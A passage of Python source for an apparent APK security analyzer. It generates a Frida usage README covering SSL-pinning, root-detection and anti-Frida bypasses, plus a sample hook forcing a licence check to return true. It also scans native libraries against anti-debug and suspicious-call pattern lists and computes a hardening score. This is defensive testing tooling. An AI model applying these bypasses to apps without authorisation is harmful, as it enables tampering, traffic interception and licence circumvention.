- Go to **Settings > Developer Options**
- Enable **USB Debugging**
- Connect device via USB
- Accept the debugging prompt on your phone

#### 3. Verify Connection
```bash
adb devices
```
You should see your device listed.

### For Rooted Devices (Recommended)

#### Download Frida Server

1. Check your device architecture:
```bash
adb shell getprop ro.product.cpu.abi
```
Common results: `arm64-v8a`, `armeabi-v7a`, `x86_64`

2. Download the matching frida-server from:
   https://github.com/frida/frida/releases

   Example: `frida-server-16.x.x-android-arm64.xz`

3. Extract and push to device:
```bash
# Extract (use 7-zip on Windows, or xz on Linux/Mac)
xz -d frida-server-16.x.x-android-arm64.xz

# Push to device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server

# Make executable
adb shell chmod 755 /data/local/tmp/frida-server
```

4. Start frida-server (in a separate terminal):
```bash
adb shell su -c "/data/local/tmp/frida-server &"
```

### For Non-Rooted Devices (Limited)

Use Frida Gadget injection (more complex):
```bash
# Requires re-packaging the APK with Frida Gadget
# See: https://frida.re/docs/gadget/
```

---

##  Running Scripts

### Basic Command Structure

```bash
frida -U -f <package_name> -l <script.js> --no-pause
```

**Parameters explained:**
- `-U` = Use USB-connected device
- `-f <package>` = Spawn (start) the app fresh
- `-l <script>` = Load this JavaScript file
- `--no-pause` = Don't pause at app startup

### For This App: {package_name}

#### Option 1: Spawn Mode (Recommended)
Starts the app fresh with hooks already in place:
```bash
frida -U -f {package_name} -l ssl_bypass.js --no-pause
```

#### Option 2: Attach Mode
Attach to an already running app:
```bash
# First, open the app on your device, then:
frida -U {package_name} -l ssl_bypass.js
```

#### Option 3: Combined Script (All Hooks)
Run all scripts at once:
```bash
frida -U -f {package_name} -l combined_hooks.js --no-pause
```

### Save Output to File
```bash
frida -U -f {package_name} -l ssl_bypass.js --no-pause -o output.log
```

---

##  Scripts Included

| Script | Category | Description |
|--------|----------|-------------|
"""
    
    for script in scripts:
        readme_content += f"| {script.get('name', 'Unknown')} | {script.get('category', '-')} | {script.get('description', '-')[:50]} |\n"
    
    if vuln_scripts:
        readme_content += "\n### Vulnerability-Specific Scripts\n\n"
        for script in vuln_scripts:
            readme_content += f"- **{script.get('name')}**: {script.get('description', '-')[:80]}\n"
    
    readme_content += f"""

### Script Categories Explained

| Category | Purpose | When to Use |
|----------|---------|-------------|
| `ssl_bypass` | Disable SSL/TLS certificate validation | When you need to intercept HTTPS traffic with Burp/mitmproxy |
| `root_bypass` | Hide root/Magisk from the app | When app refuses to run on rooted device |
| `anti_frida_bypass` | Bypass Frida detection | When app detects and blocks Frida |
| `crypto_hook` | Monitor encryption/decryption | When you need to see what data is being encrypted |
| `auth_hook` | Monitor authentication | When investigating login/token flows |
| `native_hook` | Hook native (.so) libraries | When app uses native code for security |
| `flutter_hook` | Hook Flutter framework | For Flutter-based apps |
| `react_native_hook` | Hook React Native bridge | For React Native apps |

---

##  Troubleshooting

### Common Errors and Solutions

#### "Failed to spawn: unable to find application"
**Cause:** Wrong package name or app not installed
**Solution:**
```bash
# List all installed packages
adb shell pm list packages | grep <keyword>
```

#### "Failed to attach: unable to find process"
**Cause:** App is not running
**Solution:** Open the app first, then use attach mode (without `-f`)

#### "Failed to connect to the frida-server"
**Cause:** frida-server not running or wrong version
**Solution:**
```bash
# Check if running
adb shell ps | grep frida

# Restart frida-server
adb shell su -c "pkill frida-server"
adb shell su -c "/data/local/tmp/frida-server &"

# Ensure versions match
frida --version  # on computer
adb shell /data/local/tmp/frida-server --version  # on device
```

#### "Process crashed" or "App closes immediately"
**Cause:** App has anti-Frida protection
**Solution:**
```bash
# Load anti-frida bypass FIRST
frida -U -f {package_name} -l anti_frida_bypass.js --no-pause
```

#### "TypeError: cannot read property of undefined"
**Cause:** Class or method doesn't exist in this app
**Solution:** This is normal - the script tries to hook common classes that may not exist. Check console output for successful hooks.

#### SSL Bypass Not Working
**Causes & Solutions:**
1. App uses custom SSL implementation  Try multiple bypass scripts
2. App has certificate transparency  May need additional hooks
3. Proxy not configured correctly  Check Burp/mitmproxy settings

---

##  Advanced Usage

### Loading Multiple Scripts
```bash
frida -U -f {package_name} -l anti_frida_bypass.js -l ssl_bypass.js -l root_bypass.js --no-pause
```
**Note:** Order matters! Load bypass scripts first.

### Interactive REPL Mode
```bash
frida -U -f {package_name} --no-pause
```
Then type JavaScript commands directly:
```javascript
Java.perform(function() {{
    console.log("Hello from Frida!");
}});
```

### Using with Burp Suite

1. Start frida with SSL bypass:
```bash
frida -U -f {package_name} -l ssl_bypass.js --no-pause
```

2. Configure Android proxy:
   - Settings > Wi-Fi > Long press network > Modify > Advanced
   - Set proxy to your computer's IP, port 8080

3. Install Burp CA certificate on device:
   - Export from Burp: Proxy > Options > Import/Export CA Certificate
   - Push to device and install via Settings > Security

### Using with Objection

Objection is a Frida-powered exploration toolkit:
```bash
pip install objection

# Explore app interactively
objection -g {package_name} explore

# Useful commands inside objection:
android sslpinning disable
android root disable
android hooking list classes
```

### Hooking Custom Classes

Edit a script or use REPL:
```javascript
Java.perform(function() {{
    var targetClass = Java.use('com.example.app.SecurityManager');
    
    targetClass.checkLicense.implementation = function() {{
        console.log('checkLicense() called - bypassing!');
        return true;  // Always return licensed
    }};
}});
```

---

##  Additional Resources

- **Frida Documentation:** https://frida.re/docs/
- **Frida CodeShare (community scripts):** https://codeshare.frida.re/
- **Objection Wiki:** https://github.com/sensepost/objection/wiki
- **Android Security Testing Guide:** https://mas.owasp.org/MASTG/

---

##  Legal Disclaimer

These scripts are intended for **authorized security testing only**. 
Only use on applications you have permission to test.
Unauthorized access to computer systems is illegal.

---

Generated by VRAgent APK Analyzer
"""
    
    exported_files.append({
        "filename": "README.md",
        "category": "documentation",
        "script_name": "README",
        "content": readme_content,
        "size_bytes": len(readme_content.encode('utf-8')),
        "usage": "Documentation"
    })
    
    return {
        "package_name": package_name,
        "total_files": len(exported_files),
        "total_size_bytes": sum(f["size_bytes"] for f in exported_files),
        "files": exported_files,
        "combined_script_included": combined_file is not None
    }


# ============================================================================
# Native Library Analysis
# ============================================================================

def analyze_native_libraries(apk, file_path: Path) -> Dict[str, Any]:
    """
    Analyze native libraries (.so files) in the APK.
    
    Extracts:
    - JNI function signatures
    - Exported symbols
    - Hardcoded strings and secrets
    - Anti-debugging techniques
    - Cryptographic function usage
    """
    import zipfile
    import struct
    
    result = {
        "total_libraries": 0,
        "libraries": [],
        "total_jni_functions": 0,
        "total_exported_functions": 0,
        "architectures": [],
        "security_findings": [],
        "overall_native_risk": "low"
    }
    
    # Architecture mapping
    ARCH_MAP = {
        'armeabi-v7a': 'ARM 32-bit',
        'arm64-v8a': 'ARM 64-bit',
        'x86': 'x86 32-bit',
        'x86_64': 'x86 64-bit',
        'armeabi': 'ARM (legacy)',
        'mips': 'MIPS',
        'mips64': 'MIPS 64-bit',
    }
    
    # Anti-debugging patterns to look for in native code
    ANTI_DEBUG_PATTERNS = [
        (b'ptrace', 'ptrace() anti-debugging'),
        (b'/proc/self/status', 'TracerPid check'),
        (b'/proc/self/maps', 'Memory maps inspection'),
        (b'SIGTRAP', 'SIGTRAP signal handler'),
        (b'SIGSTOP', 'SIGSTOP signal handler'),
        (b'android_dlopen_ext', 'Dynamic library loading'),
        (b'dlsym', 'Dynamic symbol resolution'),
        (b'inotify', 'File monitoring (anti-tampering)'),
        (b'/data/local/tmp', 'Temp directory check (frida detection)'),
        (b'frida', 'Frida detection'),
        (b'xposed', 'Xposed detection'),
        (b'substrate', 'Cydia Substrate detection'),
        (b'libhoudini', 'ARM translation detection'),
        (b'ro.debuggable', 'Debug build check'),
        (b'ro.secure', 'Secure boot check'),
        (b'/system/bin/su', 'Root check (native)'),
        (b'magisk', 'Magisk detection (native)'),
    ]
    
    # Crypto patterns in native code
    NATIVE_CRYPTO_PATTERNS = [
        (b'AES', 'AES encryption'),
        (b'DES', 'DES encryption (weak)'),
        (b'RSA', 'RSA encryption'),
        (b'SHA256', 'SHA-256 hashing'),
        (b'SHA1', 'SHA-1 hashing (weak)'),
        (b'MD5', 'MD5 hashing (weak)'),
        (b'HMAC', 'HMAC authentication'),
        (b'EVP_', 'OpenSSL EVP functions'),
        (b'OPENSSL', 'OpenSSL library'),
        (b'mbedtls', 'mbed TLS library'),
        (b'boringssl', 'BoringSSL library'),
        (b'sodium', 'libsodium library'),
        (b'curve25519', 'Curve25519 (modern crypto)'),
        (b'chacha', 'ChaCha20 encryption'),
        (b'poly1305', 'Poly1305 MAC'),
    ]
    
    # JNI function prefixes
    JNI_PREFIXES = [
        'Java_', 
        'JNI_OnLoad',
        'JNI_OnUnload',
        'nativeInit',
        'native_',
    ]
    
    try:
        with zipfile.ZipFile(str(file_path), 'r') as zf:
            native_files = [f for f in zf.namelist() if f.endswith('.so') and '/lib/' in f]
            
            architectures_found = set()
            total_jni = 0
            total_exported = 0
            risk_score = 0
            
            for so_path in native_files:
                # Extract architecture from path
                parts = so_path.split('/')
                arch = None
                for part in parts:
                    if part in ARCH_MAP:
                        arch = part
                        architectures_found.add(ARCH_MAP[part])
                        break
                
                lib_name = so_path.split('/')[-1]
                
                try:
                    so_data = zf.read(so_path)
                    lib_info = {
                        "name": lib_name,
                        "path": so_path,
                        "architecture": ARCH_MAP.get(arch, arch or 'unknown'),
                        "size": len(so_data),
                        "is_stripped": True,  # Will update if we find debug info
                        "has_debug_info": False,
                        "exported_functions": [],
                        "jni_functions": [],
                        "imported_libraries": [],
                        "strings": [],
                        "hardcoded_secrets": [],
                        "anti_debug_detected": False,
                        "anti_debug_techniques": [],
                        "crypto_functions": [],
                        "suspicious_patterns": [],
                    }
                    
                    # Try to parse ELF structure for more details
                    try:
                        from elftools.elf.elffile import ELFFile
                        from elftools.elf.sections import SymbolTableSection
                        from io import BytesIO
                        
                        elf = ELFFile(BytesIO(so_data))
                        
                        # Check for debug sections
                        for section in elf.iter_sections():
                            if section.name.startswith('.debug'):
                                lib_info["has_debug_info"] = True
                                lib_info["is_stripped"] = False
                                result["security_findings"].append({
                                    "library": lib_name,
                                    "finding": "Debug symbols present",
                                    "severity": "medium",
                                    "description": "Library contains debug information which aids reverse engineering"
                                })
                                break
                        
                        # Extract symbols
                        for section in elf.iter_sections():
                            if isinstance(section, SymbolTableSection):
                                for symbol in section.iter_symbols():
                                    sym_name = symbol.name
                                    if not sym_name:
                                        continue
                                    
                                    # Check for JNI functions
                                    is_jni = any(sym_name.startswith(prefix) for prefix in JNI_PREFIXES)
                                    if is_jni:
                                        lib_info["jni_functions"].append(sym_name)
                                        total_jni += 1
                                    
                                    # Exported functions (global symbols)
                                    if symbol['st_info']['bind'] == 'STB_GLOBAL' and symbol['st_shndx'] != 'SHN_UNDEF':
                                        lib_info["exported_functions"].append({
                                            "name": sym_name,
                                            "address": hex(symbol['st_value']),
                                            "size": symbol['st_size'],
                                            "is_jni": is_jni,
                                        })
                                        total_exported += 1
                        
                        # Get imported libraries
                        for section in elf.iter_sections():
                            if section.name == '.dynamic':
                                for tag in section.iter_tags():
                                    if tag.entry.d_tag == 'DT_NEEDED':
                                        lib_info["imported_libraries"].append(tag.needed)
                        
                    except Exception as elf_error:
                        logger.debug(f"ELF parsing failed for {lib_name}: {elf_error}")
                    
                    # Extract printable strings (minimum 6 chars)
                    strings_found = []
                    current_string = b''
                    for byte in so_data:
                        if 32 <= byte < 127:  # Printable ASCII
                            current_string += bytes([byte])
                        else:
                            if len(current_string) >= 6:
                                try:
                                    decoded = current_string.decode('ascii')
                                    strings_found.append(decoded)
                                except:
                                    pass
                            current_string = b''
                    
                    # Filter interesting strings
                    interesting_strings = []
                    secret_patterns_found = []
                    
                    for s in strings_found:
                        s_lower = s.lower()
                        
                        # Check for URLs
                        if s.startswith('http://') or s.startswith('https://'):
                            interesting_strings.append(s)
                            if s.startswith('http://'):
                                result["security_findings"].append({
                                    "library": lib_name,
                                    "finding": "HTTP URL in native code",
                                    "severity": "medium",
                                    "description": f"Insecure HTTP URL found: {s[:50]}..."
                                })
                        
                        # Check for potential secrets
                        if any(kw in s_lower for kw in ['api_key', 'apikey', 'secret', 'password', 'token', 'private']):
                            if len(s) > 10 and '=' in s or ':' in s:
                                secret_patterns_found.append({
                                    "type": "potential_secret",
                                    "value": s[:50] + "..." if len(s) > 50 else s,
                                    "context": "native_string"
                                })
                        
                        # Firebase/Cloud configs
                        if 'firebase' in s_lower or 'google-services' in s_lower:
                            interesting_strings.append(s)
                        
                        # Encryption keys (base64-like long strings)
                        if len(s) >= 32 and s.replace('+', '').replace('/', '').replace('=', '').isalnum():
                            if not any(c in s for c in [' ', '\n', '\t']):
                                secret_patterns_found.append({
                                    "type": "potential_key",
                                    "value": s[:20] + "..." if len(s) > 20 else s,
                                    "length": len(s)
                                })
                    
                    lib_info["strings"] = interesting_strings[:50]
                    lib_info["hardcoded_secrets"] = secret_patterns_found[:10]
                    
                    if secret_patterns_found:
                        risk_score += len(secret_patterns_found) * 5
                        result["security_findings"].append({
                            "library": lib_name,
                            "finding": f"{len(secret_patterns_found)} potential secrets in native code",
                            "severity": "high",
                            "description": "Hardcoded secrets found in native library"
                        })
                    
                    # Check for anti-debugging patterns
                    for pattern, description in ANTI_DEBUG_PATTERNS:
                        if pattern in so_data:
                            lib_info["anti_debug_detected"] = True
                            lib_info["anti_debug_techniques"].append(description)
                    
                    if lib_info["anti_debug_detected"]:
                        risk_score += 10
                        result["security_findings"].append({
                            "library": lib_name,
                            "finding": "Anti-debugging techniques detected",
                            "severity": "info",
                            "description": f"Techniques: {', '.join(lib_info['anti_debug_techniques'][:5])}"
                        })
                    
                    # Check for crypto patterns
                    for pattern, description in NATIVE_CRYPTO_PATTERNS:
                        if pattern in so_data:
                            lib_info["crypto_functions"].append(description)
                    
                    # Check for suspicious patterns
                    suspicious_checks = [
                        (b'system(', 'system() call - command execution'),
                        (b'exec', 'exec() family - process execution'),
                        (b'popen', 'popen() - command execution'),
                        (b'dlopen', 'dlopen() - dynamic loading'),
                        (b'mprotect', 'mprotect() - memory protection changes'),
                        (b'mmap', 'mmap() - memory mapping'),
                        (b'fork', 'fork() - process creation'),
                        (b'socket', 'socket() - network operations'),
                        (b'connect', 'connect() - network connections'),
                        (b'send', 'send() - network transmission'),
                        (b'recv', 'recv() - network reception'),
                    ]
                    
                    for pattern, description in suspicious_checks:
                        if pattern in so_data:
                            lib_info["suspicious_patterns"].append({
                                "pattern": pattern.decode('ascii', errors='ignore'),
                                "description": description
                            })
                    
                    result["libraries"].append(lib_info)
                    
                except Exception as lib_error:
                    logger.debug(f"Error analyzing {so_path}: {lib_error}")
                    result["libraries"].append({
                        "name": lib_name,
                        "path": so_path,
                        "error": str(lib_error)
                    })
            
            result["total_libraries"] = len(native_files)
            result["total_jni_functions"] = total_jni
            result["total_exported_functions"] = total_exported
            result["architectures"] = list(architectures_found)
            
            # Determine overall risk
            if risk_score >= 50:
                result["overall_native_risk"] = "critical"
            elif risk_score >= 30:
                result["overall_native_risk"] = "high"
            elif risk_score >= 15:
                result["overall_native_risk"] = "medium"
            else:
                result["overall_native_risk"] = "low"
            
    except Exception as e:
        logger.error(f"Native library analysis failed: {e}")
        result["error"] = str(e)
    
    return result


# ============================================================================
# Hardening Score Calculator
# ============================================================================

def calculate_hardening_score(
    package_name: str,
    permissions: List[ApkPermission],
    components: List[ApkComponent],
    debuggable: bool,
    allow_backup: bool,
    min_sdk: Optional[int],
    target_sdk: Optional[int],
    certificate: Optional[ApkCertificate],
    strings: List[ExtractedString],
    urls: List[str],
    native_analysis: Optional[Dict[str, Any]],
    dex_analysis: Optional[Dict[str, Any]],
    network_config_analysis: Optional[Dict[str, Any]],
    security_issues: List[Dict[str, Any]],
    dynamic_analysis: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """
    Calculate a comprehensive security hardening score for the APK.
    
    Categories:
    1. Code Protection (25%) - Obfuscation, anti-tampering, native protections
    2. Network Security (20%) - SSL pinning, cleartext, HTTPS usage
    3. Data Storage (20%) - Backup, encryption, secure storage
    4. Authentication & Crypto (15%) - Crypto strength, auth mechanisms
    5. Platform Security (20%) - Permissions, SDK versions, exported components
    """
    categories = []
    
    # ========================================================================
    # 1. CODE PROTECTION (25% weight)
    # ========================================================================
    code_score = 100
    code_findings = []
    code_recommendations = []
    
    # Check debuggable
    if debuggable:
        code_score -= 40
        code_findings.append({
            "issue": "App is debuggable",
            "severity": "critical",
            "impact": -40
        })
        code_recommendations.append("Set android:debuggable=\"false\" in release builds")
    
    # Check for obfuscation (look for short class names in dex analysis)
    obfuscation_detected = False
    if dex_analysis:
        class_names = [c.get("name", "") for c in dex_analysis.get("classes", [])]
        short_names = [n for n in class_names if len(n.split('.')[-1]) <= 2]
        if len(short_names) > len(class_names) * 0.3:
            obfuscation_detected = True
            code_score += 15
            code_findings.append({
                "issue": "Code obfuscation detected (ProGuard/R8)",
                "severity": "positive",
                "impact": 15
            })
    
    if not obfuscation_detected:
        code_score -= 15
        code_findings.append({
            "issue": "No code obfuscation detected",
            "severity": "medium",
            "impact": -15
        })
        code_recommendations.append("Enable ProGuard/R8 obfuscation for release builds")
    
    # Check for native protections
    if native_analysis:
        if native_analysis.get("total_libraries", 0) > 0:
            has_anti_debug = any(
                lib.get("anti_debug_detected", False) 
                for lib in native_analysis.get("libraries", [])
            )
            if has_anti_debug:
                code_score += 10
                code_findings.append({
                    "issue": "Native anti-debugging detected",
                    "severity": "positive",
                    "impact": 10
                })
            
            # Check for stripped binaries
            stripped_count = sum(
                1 for lib in native_analysis.get("libraries", [])
                if lib.get("is_stripped", False)
            )
            if stripped_count == native_analysis["total_libraries"]:
                code_score += 5
                code_findings.append({
                    "issue": "All native libraries are stripped",
                    "severity": "positive",
                    "impact": 5
                })
    
    # Check for anti-tampering indicators
    if dex_analysis:
        anti_tamper_patterns = dex_analysis.get("anti_analysis_detected", [])
        if anti_tamper_patterns:
            code_score += 10
            code_findings.append({
                "issue": f"Anti-analysis techniques detected ({len(anti_tamper_patterns)})",
                "severity": "positive",
                "impact": 10
            })
    
    # Check for root detection
    if dynamic_analysis and dynamic_analysis.get("root_detection_detected"):
        code_score += 10
        code_findings.append({
            "issue": "Root detection implemented",
            "severity": "positive",
            "impact": 10
        })
    else:
        code_score -= 10
        code_recommendations.append("Implement root detection for sensitive apps")
    
    code_score = max(0, min(100, code_score))
    categories.append({
        "name": "Code Protection",
        "score": code_score,
        "max_score": 100,
        "weight": 0.25,
        "findings": code_findings,
        "recommendations": code_recommendations,
        "icon": ""
    })
    
    # ========================================================================
    # 2. NETWORK SECURITY (20% weight)
    # ========================================================================
    network_score = 100
    network_findings = []
    network_recommendations = []
    
    # Check for HTTP URLs
    http_urls = [u for u in urls if u.startswith('http://') and 'localhost' not in u]
    if http_urls:
        penalty = min(30, len(http_urls) * 5)
        network_score -= penalty
        network_findings.append({
            "issue": f"{len(http_urls)} insecure HTTP URLs found",
            "severity": "high",
            "impact": -penalty
        })
        network_recommendations.append("Replace all HTTP URLs with HTTPS")
    
    # Check for SSL pinning
    if dynamic_analysis and dynamic_analysis.get("ssl_pinning_detected"):
        network_score += 20
        network_findings.append({
            "issue": "SSL certificate pinning detected",
            "severity": "positive",
            "impact": 20
        })
    else:
        network_score -= 20
        network_findings.append({
            "issue": "No SSL pinning detected",
            "severity": "medium",
            "impact": -20
        })
        network_recommendations.append("Implement certificate pinning for API connections")
    
    # Check network security config
    if network_config_analysis:
        if network_config_analysis.get("cleartext_permitted"):
            network_score -= 20
            network_findings.append({
                "issue": "Cleartext traffic permitted",
                "severity": "high",
                "impact": -20
            })
            network_recommendations.append("Disable cleartext traffic in network_security_config.xml")
        
        if network_config_analysis.get("certificate_pins"):
            network_score += 10
            network_findings.append({
                "issue": "Certificate pins configured in network security config",
                "severity": "positive",
                "impact": 10
            })
    
    network_score = max(0, min(100, network_score))
    categories.append({
        "name": "Network Security",
        "score": network_score,
        "max_score": 100,
        "weight": 0.20,
        "findings": network_findings,
        "recommendations": network_recommendations,
        "icon": ""
    })
    
    # ========================================================================
    # 3. DATA STORAGE (20% weight)
    # ========================================================================
    storage_score = 100
    storage_findings = []
    storage_recommendations = []
    
    # Check backup setting
    if allow_backup:
        storage_score -= 20
        storage_findings.append({
            "issue": "App data backup enabled",
            "severity": "medium",
            "impact": -20
        })
        storage_recommendations.append("Set android:allowBackup=\"false\" or implement BackupAgent")
    else:
        storage_score += 10
        storage_findings.append({
            "issue": "App data backup disabled",
            "severity": "positive",
            "impact": 10
        })
    
    # Check for hardcoded secrets
    secrets = [s for s in strings if s.category in ['api_key', 'password', 'private_key', 'jwt']]
    if secrets:
        penalty = min(40, len(secrets) * 10)
        storage_score -= penalty
        storage_findings.append({
            "issue": f"{len(secrets)} hardcoded secrets found",
            "severity": "critical",
            "impact": -penalty
        })
        storage_recommendations.append("Remove hardcoded secrets, use Android Keystore or secure storage")
    
    # Check for encrypted storage indicators
    encrypted_storage_patterns = ['EncryptedSharedPreferences', 'AndroidKeyStore', 'KeyStore']
    has_encrypted_storage = any(
        any(p in s.value for p in encrypted_storage_patterns)
        for s in strings
    )
    if has_encrypted_storage:
        storage_score += 15
        storage_findings.append({
            "issue": "Encrypted storage mechanisms detected",
            "severity": "positive",
            "impact": 15
        })
    
    # Check native secrets
    if native_analysis:
        native_secrets = sum(
            len(lib.get("hardcoded_secrets", []))
            for lib in native_analysis.get("libraries", [])
        )
        if native_secrets:
            penalty = min(25, native_secrets * 5)
            storage_score -= penalty
            storage_findings.append({
                "issue": f"{native_secrets} potential secrets in native code",
                "severity": "high",
                "impact": -penalty
            })
            storage_recommendations.append("Review and remove secrets from native libraries")
    
    storage_score = max(0, min(100, storage_score))
    categories.append({
        "name": "Data Storage",
        "score": storage_score,
        "max_score": 100,
        "weight": 0.20,
        "findings": storage_findings,
        "recommendations": storage_recommendations,
        "icon": ""
    })
    
    # ========================================================================
    # 4. AUTHENTICATION & CRYPTO (15% weight)
    # ========================================================================
    crypto_score = 100
    crypto_findings = []
    crypto_recommendations = []
    
    # Check for weak crypto
    weak_crypto_patterns = ['DES', 'RC4', 'MD5', 'SHA1', 'ECB']
    weak_crypto_found = []
    for s in strings:
        for pattern in weak_crypto_patterns:
            if pattern in s.value and pattern not in weak_crypto_found:
                weak_crypto_found.append(pattern)
    
    if weak_crypto_found:
        penalty = len(weak_crypto_found) * 10
        crypto_score -= penalty
        crypto_findings.append({
            "issue": f"Weak cryptographic algorithms: {', '.join(weak_crypto_found)}",
            "severity": "high",
            "impact": -penalty
        })
        crypto_recommendations.append("Use AES-256-GCM for encryption, SHA-256+ for hashing")
    
    # Check for strong crypto indicators
    strong_crypto = ['AES-256', 'ChaCha20', 'curve25519', 'PBKDF2', 'Argon2']
    strong_found = [p for p in strong_crypto if any(p.lower() in s.value.lower() for s in strings)]
    if strong_found:
        crypto_score += 15
        crypto_findings.append({
            "issue": f"Strong cryptography detected: {', '.join(strong_found)}",
            "severity": "positive",
            "impact": 15
        })
    
    # Check for biometric auth
    biometric_patterns = ['BiometricPrompt', 'FingerprintManager', 'biometric']
    has_biometric = any(any(p in s.value for p in biometric_patterns) for s in strings)
    if has_biometric:
        crypto_score += 10
        crypto_findings.append({
            "issue": "Biometric authentication supported",
            "severity": "positive",
            "impact": 10
        })
    
    crypto_score = max(0, min(100, crypto_score))
    categories.append({
        "name": "Authentication & Crypto",
        "score": crypto_score,
        "max_score": 100,
        "weight": 0.15,
        "findings": crypto_findings,
        "recommendations": crypto_recommendations,
        "icon": ""
    })
    
    # ========================================================================
    # 5. PLATFORM SECURITY (20% weight)
    # ========================================================================
    platform_score = 100
    platform_findings = []
    platform_recommendations = []
    
    # Check target SDK
    if target_sdk:
        if target_sdk < 28:  # Android 9
            platform_score -= 30
            platform_findings.append({
                "issue": f"Outdated target SDK: {target_sdk} (< Android 9)",
                "severity": "high",
                "impact": -30
            })
            platform_recommendations.append(f"Update targetSdkVersion to at least 33 (Android 13)")
        elif target_sdk < 30:  # Android 11
            platform_score -= 15
            platform_findings.append({
                "issue": f"Old target SDK: {target_sdk} (< Android 11)",
                "severity": "medium",
                "impact": -15
            })
            platform_recommendations.append("Consider updating targetSdkVersion to 33+")
        else:
            platform_score += 10
            platform_findings.append({
                "issue": f"Modern target SDK: {target_sdk}",
                "severity": "positive",
                "impact": 10
            })
    
    # Check dangerous permissions
    dangerous_perms = [p for p in permissions if p.is_dangerous]
    if len(dangerous_perms) > 5:
        penalty = min(25, (len(dangerous_perms) - 5) * 3)
        platform_score -= penalty
        platform_findings.append({
            "issue": f"Excessive dangerous permissions: {len(dangerous_perms)}",
            "severity": "medium",
            "impact": -penalty
        })
        platform_recommendations.append("Review and minimize dangerous permission requests")
    
    # Check exported components
    exported_unprotected = [
        c for c in components 
        if c.is_exported and c.component_type != 'activity'
    ]
    if exported_unprotected:
        penalty = min(20, len(exported_unprotected) * 4)
        platform_score -= penalty
        platform_findings.append({
            "issue": f"{len(exported_unprotected)} exported components without protection",
            "severity": "medium",
            "impact": -penalty
        })
        platform_recommendations.append("Add permission requirements to exported components")
    
    # Check certificate validity
    if certificate:
        from datetime import datetime
        try:
            not_after = datetime.strptime(certificate.valid_until, "%Y-%m-%d %H:%M:%S")
            if not_after < datetime.now():
                platform_score -= 20
                platform_findings.append({
                    "issue": "Certificate has expired",
                    "severity": "high",
                    "impact": -20
                })
            elif (not_after - datetime.now()).days < 365:
                platform_score -= 5
                platform_findings.append({
                    "issue": "Certificate expires within 1 year",
                    "severity": "low",
                    "impact": -5
                })
        except:
            pass
    
    platform_score = max(0, min(100, platform_score))
    categories.append({
        "name": "Platform Security",
        "score": platform_score,
        "max_score": 100,
        "weight": 0.20,
        "findings": platform_findings,
        "recommendations": platform_recommendations,
        "icon": ""
    })
    
    # ========================================================================
    # Calculate Overall Score
    # ========================================================================
    overall_score = sum(cat["score"] * cat["weight"] for cat in categories)
    overall_score = int(overall_score)
    
    # Determine grade and risk level
    if overall_score >= 90:
        grade = "A"
        risk_level = "Low"
    elif overall_score >= 80:
        grade = "B"
        risk_level = "Low"
    elif overall_score >= 70:
        grade = "C"
        risk_level = "Medium"
    elif overall_score >= 60:
        grade = "D"
        risk_level = "Medium"
    elif overall_score >= 50:
        grade = "D"
        risk_level = "High"
    else:
        grade = "F"
        risk_level = "Critical"
    
    # Compile top risks and recommendations
    all_findings = []
    for cat in categories:
        for f in cat["findings"]:
            if f.get("severity") in ["critical", "high"]:
                all_findings.append({
                    "category": cat["name"],
                    **f
                })
    
    top_risks = [f["issue"] for f in sorted(all_findings, key=lambda x: x.get("impact", 0))[:5]]
    
    all_recommendations = []
    for cat in categories:
        all_recommendations.extend(cat["recommendations"])
    top_recommendations = all_recommendations[:7]
    
    # Generate summary
    if grade in ["A", "B"]:
        summary = f"This APK demonstrates strong security practices with a score of {overall_score}/100. "
        summary += "It implements multiple protection mechanisms and follows security best practices."
    elif grade == "C":
        summary = f"This APK has moderate security with a score of {overall_score}/100. "
        summary += "While some protections are in place, there are areas that need improvement."
    elif grade == "D":
        summary = f"This APK has weak security with a score of {overall_score}/100. "
        summary += "Significant security improvements are recommended before production deployment."
    else:
        summary = f"This APK has critical security issues with a score of {overall_score}/100. "
        summary += "Immediate security remediation is required. The app is vulnerable to common attacks."
    
    # Calculate sub-scores
    attack_surface_score = int((platform_score * 0.5 + network_score * 0.3 + storage_score * 0.2))
    protection_score = int((code_score * 0.6 + crypto_score * 0.4))
    data_security_score = int((storage_score * 0.5 + crypto_score * 0.3 + network_score * 0.2))
    
    return {
        "overall_score": overall_score,
        "grade": grade,
        "risk_level": risk_level,
        "categories": categories,
        "attack_surface_score": attack_surface_score,
        "protection_score": protection_score,
        "data_security_score": data_security_score,
        "summary": summary,
        "top_risks": top_risks,
        "top_recommendations": top_recommendations,
    }


def analyze_smali_bytecode(apk, file_path: Path, 
                           target_classes: Optional[List[str]] = None,
                           max_methods: int = 100,
                           max_instructions_per_method: int = 500) -> Dict[str, Any]:
    """
    Decompile DEX bytecode to Smali format for reverse engineering analysis.
    
    Args:
        apk: androguard APK object
        file_path: Path to APK file
        target_classes: Optional list of specific class names to decompile (e.g., ['com.example.MainActivity'])
        max_methods: Maximum number of methods to decompile
        max_instructions_per_method: Maximum instructions per method to prevent huge outputs
    
    Returns:
        Dict containing:
            - decompiled_methods: List of SmaliMethodCode objects as dicts
            - class_smali: Dict mapping class names to full smali class definitions
            - statistics: Counts and metadata
            - interesting_methods: Methods containing suspicious patterns
    """
    result = {
        "decompiled_methods": [],
        "class_smali": {},
        "statistics": {
            "total_methods_analyzed": 0,
            "total_instructions": 0,
            "native_methods": 0,
            "abstract_methods": 0,
            "classes_analyzed": 0,
        },
        "interesting_methods": [],
        "search_index": [],  # For frontend search functionality
    }
    
    if not ANDROGUARD_AVAILABLE:
        result["error"] = "androguard not available"
        return result
    
    try:
        from androguard.core.dex import DEX
        
        methods_count = 0
        
        with zipfile.ZipFile(file_path, 'r') as zf:
            dex_files = [n for n in zf.namelist() if n.endswith('.dex')]
            
            for dex_name in dex_files:
                if methods_count >= max_methods:
                    break
                    
                try:
                    dex_data = zf.read(dex_name)
                    dex = DEX(dex_data)
                    
                    for cls in dex.get_classes():
                        if methods_count >= max_methods:
                            break
                        
                        class_name = cls.get_name()
                        readable_class = class_name.replace('/', '.').strip('L;')
                        
                        # If target classes specified, only process those
                        if target_classes:
                            if not any(t in readable_class for t in target_classes):
                                continue
                        
                        result["statistics"]["classes_analyzed"] += 1
                        
                        # Build class-level smali
                        class_smali_lines = []
                        class_smali_lines.append(f".class {_get_access_flags_string(cls)} {class_name}")
                        
                        superclass = cls.get_superclassname()
                        if superclass:
                            class_smali_lines.append(f".super {superclass}")
                        
                        # Add interfaces
                        if hasattr(cls, 'get_interfaces'):
                            for iface in cls.get_interfaces():
                                class_smali_lines.append(f".implements {iface}")
                        
